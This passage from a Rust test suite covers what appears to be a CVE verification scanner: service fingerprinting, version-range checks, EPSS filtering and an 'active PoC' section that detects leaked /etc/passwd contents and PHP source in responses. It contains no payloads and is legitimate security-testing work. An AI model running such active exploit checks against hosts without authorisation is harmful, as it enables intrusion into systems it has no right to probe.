        let o = ProbeOutcome::WrongService { method: "http_probe".into(), proof: "not apache".into() };
        let (s, _, _) = evaluate(&o, None, Some("2.4.49"));
        assert_eq!(s, VerifyStatus::Refuted);
    }

    #[test]
    fn evaluate_behavior_is_exploited_regardless_of_range() {
        let o = ProbeOutcome::Behavior { method: "docker_api_probe".into(), proof: "api".into() };
        let (s, _, _) = evaluate(&o, Some("0"), Some("1.0"));
        assert_eq!(s, VerifyStatus::Exploited);
    }

    #[test]
    fn evaluate_present_version_in_range_confirms() {
        let o = ProbeOutcome::Present { method: "ssh_banner".into(), version: Some("9.0".into()), proof: "ssh".into() };
        let (s, _, proof) = evaluate(&o, Some("8.5"), Some("9.7"));
        assert_eq!(s, VerifyStatus::Confirmed);
        assert!(proof.contains("within affected range"));
    }

    #[test]
    fn evaluate_present_version_out_of_range_refutes() {
        let o = ProbeOutcome::Present { method: "ssh_banner".into(), version: Some("9.9".into()), proof: "ssh".into() };
        let (s, _, proof) = evaluate(&o, Some("8.5"), Some("9.7"));
        assert_eq!(s, VerifyStatus::Refuted);
        assert!(proof.contains("outside affected range"));
    }

    #[test]
    fn evaluate_present_no_version_confirms_on_presence() {
        let o = ProbeOutcome::Present { method: "rdp_probe".into(), version: None, proof: "rdp".into() };
        let (s, _, _) = evaluate(&o, Some("0"), Some("999"));
        assert_eq!(s, VerifyStatus::Confirmed);
    }

    // ---- http_fingerprint (pure) — the "refuse without a real check" guarantee ----

    #[test]
    fn http_apache_confirmed_from_server_header() {
        let o = http_fingerprint("apache", "server: Apache/2.4.49 (Unix)\nx-powered-by: ", "");
        match o {
            ProbeOutcome::Present { version, .. } => assert_eq!(version, Some("2.4.49".into())),
            other => panic!("expected Present, got {other:?}"),
        }
    }

    #[test]
    fn http_apache_refused_when_server_is_nginx() {
        // A live nginx site matched for an Apache CVE must NOT be confirmed.
        let o = http_fingerprint("apache", "server: nginx/1.24.0\nx-powered-by: ", "<html></html>");
        assert!(matches!(o, ProbeOutcome::WrongService { .. }));
        let (status, _, _) = evaluate(&o, Some("2.4.49"), Some("2.4.49"));
        assert_eq!(status, VerifyStatus::Refuted);
    }

    #[test]
    fn http_wordpress_confirmed_from_body_and_version() {
        let body = r#"<meta name="generator" content="WordPress 6.1.1" /><link href="/wp-content/x.css">"#;
        let o = http_fingerprint("wordpress", "server: nginx", body);
        match o {
            ProbeOutcome::Present { version, .. } => assert_eq!(version, Some("6.1.1".into())),
            other => panic!("expected Present, got {other:?}"),
        }
    }

    #[test]
    fn http_wordpress_refused_without_markers() {
        let o = http_fingerprint("wordpress", "server: nginx", "<html><body>plain site</body></html>");
        assert!(matches!(o, ProbeOutcome::WrongService { .. }));
    }

    #[test]
    fn http_nginx_version_extracted() {
        let o = http_fingerprint("nginx", "server: nginx/1.20.0", "");
        assert!(matches!(o, ProbeOutcome::Present { version: Some(ref v), .. } if v == "1.20.0"));
    }

    #[test]
    fn http_iis_version_extracted() {
        let o = http_fingerprint("iis", "server: Microsoft-IIS/10.0", "");
        assert!(matches!(o, ProbeOutcome::Present { version: Some(ref v), .. } if v == "10.0"));
    }

    #[test]
    fn http_php_from_powered_by() {
        let o = http_fingerprint("php", "server: apache\nx-powered-by: PHP/8.1.2", "");
        assert!(matches!(o, ProbeOutcome::Present { version: Some(ref v), .. } if v == "8.1.2"));
    }

    #[test]
    fn http_drupal_from_generator_header() {
        let o = http_fingerprint("drupal", "server: nginx\nx-generator: Drupal 9 (https://www.drupal.org)", "");
        assert!(matches!(o, ProbeOutcome::Present { .. }));
    }

    #[test]
    fn http_exchange_from_owa_header() {
        let o = http_fingerprint("exchange", "server: Microsoft-IIS/10.0\nx-owa-version: 15.2.1118.7", "");
        assert!(matches!(o, ProbeOutcome::Present { .. }));
    }

    #[test]
    fn http_unhandled_tech_is_wrong_service() {
        let o = http_fingerprint("cobol", "server: whatever", "");
        assert!(matches!(o, ProbeOutcome::WrongService { .. }));
    }

    // ---- active PoC signatures (#2) ----

    #[test]
    fn truncate_never_splits_utf8() {
        // "見" is 3 bytes; truncating at 1 or 2 bytes must not panic and must land on a boundary.
        let s = "aaa見bbb";
        for max in 0..s.len() + 2 {
            let t = truncate_on_char_boundary(s, max);
            assert!(s.starts_with(t));
            assert!(t.len() <= max || max >= s.len());
        }
        // A body larger than the cap that ends mid-multibyte-char (the live crash case).
        let big = "x".repeat(100).to_string() + &"—".repeat(50); // en-dash is 3 bytes
        let t = truncate_on_char_boundary(&big, 101);
        assert!(big.is_char_boundary(t.len()));
    }

    #[test]
    fn etc_passwd_signature() {
        assert!(is_etc_passwd("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...\n"));
        assert!(!is_etc_passwd("<html>404 Not Found</html>"));
        assert!(!is_etc_passwd("root is here but not a passwd line"));
    }

    #[test]
    fn php_source_leak_signature() {
        assert!(is_php_source_leak("<code><span style=\"color: #000000\">\n<span style=\"color: #0000BB\">&lt;?php"));
        assert!(!is_php_source_leak("<html><body>normal page</body></html>"));
    }

    // ---- MSSQL PRELOGIN version parse (#4) ----

    #[test]
    fn mssql_prelogin_version_parsed() {
        // TDS response: header(8) + option table(VERSION off=6 len=6, terminator) + version data.
        // Version 15.0.4197 => major=15, minor=0, build=0x1065.
        let resp: &[u8] = &[
            0x04, 0x01, 0x00, 0x14, 0x00, 0x00, 0x01, 0x00, // header
            0x00, 0x00, 0x06, 0x00, 0x06, 0xff,             // VERSION off=6 len=6, terminator
            15, 0, 0x10, 0x65, 0, 0,                        // version bytes
        ];
        assert_eq!(parse_mssql_prelogin_version(resp), Some("15.0.4197".into()));
    }

    #[test]
    fn mssql_prelogin_rejects_non_tds() {
        assert_eq!(parse_mssql_prelogin_version(&[0x00, 0x01, 0x02]), None);
    }

    // ---- VNC RFB version (#4) ----

    #[test]
    fn rfb_version_parsed() {
        assert_eq!(parse_rfb_version("RFB 003.008"), Some("3.8".into()));
        assert_eq!(parse_rfb_version("RFB 003.003\n"), Some("3.3".into()));
        assert_eq!(parse_rfb_version("HTTP/1.1 200"), None);
    }

    // ---- EPSS prioritization + actual-port probing (#3, #6) ----

    #[test]
    fn min_epss_filters_low_scores() {
        let conn = in_memory_db();
        crate::cve::seed_hardcoded_cves(&conn).unwrap();
        // MySQL 5.6.4 falls inside several legacy mysql CVE ranges (multiple matches).
        conn.execute_batch(
            "INSERT INTO domains (domain, ip) VALUES ('db.ch', '127.0.0.1');
             INSERT INTO ports_info (domain, port, service, banner) VALUES ('db.ch', 3306, 'mysql', 'MySQL 5.6.4');",
        ).unwrap();
        { crate::cve::populate_domain_technologies(&conn).unwrap(); crate::cve::run_cve_matching(&conn).unwrap() };
        // Give one mysql CVE a high EPSS, leave the others null.
        conn.execute("UPDATE cve_catalog SET epss_score=0.9 WHERE cve_id='CVE-2016-6662'", []).unwrap();

        let all = load_pending_verifications(&conn, None, false, 30, 0.0).unwrap();
        let filtered = load_pending_verifications(&conn, None, false, 30, 0.5).unwrap();
        assert!(all.len() > filtered.len(), "min_epss should drop low/undefined-EPSS CVEs");
        assert!(filtered.iter().all(|t| t.cve_id == "CVE-2016-6662"));
    }

    #[test]
    fn detected_port_used_for_nonstandard_service() {
        // MySQL exposed on a non-standard port 3307 must be matched and probed on 3307.
        let conn = in_memory_db();
        crate::cve::seed_hardcoded_cves(&conn).unwrap();
        conn.execute_batch(
            "INSERT INTO domains (domain, ip) VALUES ('db.ch', '127.0.0.1');
             INSERT INTO ports_info (domain, port, service, banner) VALUES ('db.ch', 3307, 'mysql', 'MySQL 8.0.30');",
        ).unwrap();
        { crate::cve::populate_domain_technologies(&conn).unwrap(); crate::cve::run_cve_matching(&conn).unwrap() };
        let tasks = load_pending_verifications(&conn, None, false, 30, 0.0).unwrap();
        let t = tasks.iter().find(|t| t.technology == "mysql").expect("mysql matched on non-standard port");
        assert_eq!(t.port, 3307, "probe should target the actual detected port, not the 3306 default");
    }

    // ---- DB plumbing ----

    #[test]
    fn seed_verification_table_created() {
        let conn = in_memory_db();
        let count: i64 = conn
            .query_row("SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='cve_verifications'", [], |r| r.get(0))
            .unwrap();
        assert_eq!(count, 1);
    }

    #[test]
    fn flush_verification_batch_inserts_and_is_idempotent() {
        let conn = in_memory_db();
        flush_verification_batch(&conn, &[VerificationResult {
            domain: "example.ch".into(), cve_id: "CVE-2024-41110".into(), verified: 2,
            check_method: "tcp_probe".into(), proof: Some("closed".into()),
        }]).unwrap();
        flush_verification_batch(&conn, &[VerificationResult {
            domain: "example.ch".into(), cve_id: "CVE-2024-41110".into(), verified: 1,
            check_method: "docker_api_probe".into(), proof: Some("confirmed".into()),
        }]).unwrap();

        let count: i64 = conn.query_row("SELECT COUNT(*) FROM cve_verifications", [], |r| r.get(0)).unwrap();
        assert_eq!(count, 1);
        let verified: i32 = conn
            .query_row("SELECT verified FROM cve_verifications WHERE domain='example.ch'", [], |r| r.get(0))
            .unwrap();
        assert_eq!(verified, 1);
    }

    #[test]
    fn technology_port_mapping_covers_new_services() {
        assert_eq!(technology_port("mysql"), Some(3306));
        assert_eq!(technology_port("mongodb"), Some(27017));
        assert_eq!(technology_port("postgresql"), Some(5432));
        assert_eq!(technology_port("vnc"), Some(5900));
        assert_eq!(technology_port("wordpress"), None);
    }

    #[test]
    fn is_http_tech_classifies_correctly() {
        assert!(is_http_tech("apache"));
        assert!(is_http_tech("wordpress"));
        assert!(!is_http_tech("mysql"));
        assert!(!is_http_tech("rdp"));
    }

    #[test]
    fn load_pending_skips_recently_verified_but_keeps_stale() {
        let conn = in_memory_db();
        crate::cve::seed_hardcoded_cves(&conn).unwrap();
        conn.execute_batch(
            "INSERT INTO domains (domain, ip) VALUES ('db.ch', '127.0.0.1');
             INSERT INTO ports_info (domain, port, service, banner)
             VALUES ('db.ch', 3306, 'mysql', 'MySQL 8.0.30');",
        ).unwrap();
        { crate::cve::populate_domain_technologies(&conn).unwrap(); crate::cve::run_cve_matching(&conn).unwrap() };

        // Freshly verified pair (checked_at = now) is skipped.
        conn.execute(
            "INSERT INTO cve_verifications (domain, cve_id, verified, checked_at, check_method)
             VALUES ('db.ch', 'CVE-2023-21980', 1, datetime('now'), 'mysql_handshake')",
            [],
        ).unwrap();
        let tasks = load_pending_verifications(&conn, None, false, 30, 0.0).unwrap();
        assert!(!tasks.iter().any(|t| t.cve_id == "CVE-2023-21980"), "fresh verification should be skipped");

        // Make it stale (checked 40 days ago) → it should come back as pending.
        conn.execute(
            "UPDATE cve_verifications SET checked_at = datetime('now','-40 days') WHERE cve_id='CVE-2023-21980'",
            [],
        ).unwrap();
        let tasks = load_pending_verifications(&conn, None, false, 30, 0.0).unwrap();
        assert!(tasks.iter().any(|t| t.cve_id == "CVE-2023-21980"), "stale verification should be re-queued");
    }

    #[test]
    fn load_pending_carries_affected_range() {
        let conn = in_memory_db();
        crate::cve::seed_hardcoded_cves(&conn).unwrap();
        conn.execute_batch(
            "INSERT INTO domains (domain, ip) VALUES ('db.ch', '127.0.0.1');
             INSERT INTO ports_info (domain, port, service, banner)
             VALUES ('db.ch', 3306, 'mysql', 'MySQL 8.0.30');",
        ).unwrap();
        { crate::cve::populate_domain_technologies(&conn).unwrap(); crate::cve::run_cve_matching(&conn).unwrap() };
        let tasks = load_pending_verifications(&conn, None, false, 30, 0.0).unwrap();
        let t = tasks.iter().find(|t| t.cve_id == "CVE-2023-21980").expect("mysql cve present");
        assert_eq!(t.affected_from.as_deref(), Some("8.0.0"));
        assert_eq!(t.affected_to.as_deref(), Some("8.0.32"));
    }

    #[test]
    fn retry_ignores_staleness() {
        let conn = in_memory_db();
        crate::cve::seed_hardcoded_cves(&conn).unwrap();
        conn.execute_batch(
            "INSERT INTO domains (domain, ip) VALUES ('db.ch', '127.0.0.1');
             INSERT INTO ports_info (domain, port, service, banner)
             VALUES ('db.ch', 3306, 'mysql', 'MySQL 8.0.30');",
        ).unwrap();
        { crate::cve::populate_domain_technologies(&conn).unwrap(); crate::cve::run_cve_matching(&conn).unwrap() };
        conn.execute(
            "INSERT INTO cve_verifications (domain, cve_id, verified, checked_at, check_method)
             VALUES ('db.ch', 'CVE-2023-21980', 1, datetime('now'), 'mysql_handshake')",
            [],
        ).unwrap();
        // Without retry the fresh pair is skipped; with retry it is included.
        assert!(!load_pending_verifications(&conn, None, false, 30, 0.0).unwrap().iter().any(|t| t.cve_id == "CVE-2023-21980"));
        assert!(load_pending_verifications(&conn, None, true, 30, 0.0).unwrap().iter().any(|t| t.cve_id == "CVE-2023-21980"));
    }

    #[test]
    fn http_tasks_loaded_with_range() {
        let conn = in_memory_db();
        crate::cve::seed_hardcoded_cves(&conn).unwrap();
        conn.execute_batch(
            "INSERT INTO domains (domain, ip, server) VALUES ('web.ch', '127.0.0.1', 'Apache/2.4.49');",
        ).unwrap();
        { crate::cve::populate_domain_technologies(&conn).unwrap(); crate::cve::run_cve_matching(&conn).unwrap() };
        let tasks = load_http_pending_verifications(&conn, false, 30, 0.0).unwrap();
        assert!(tasks.iter().any(|t| t.technology == "apache"), "expected apache http task");
    }
}
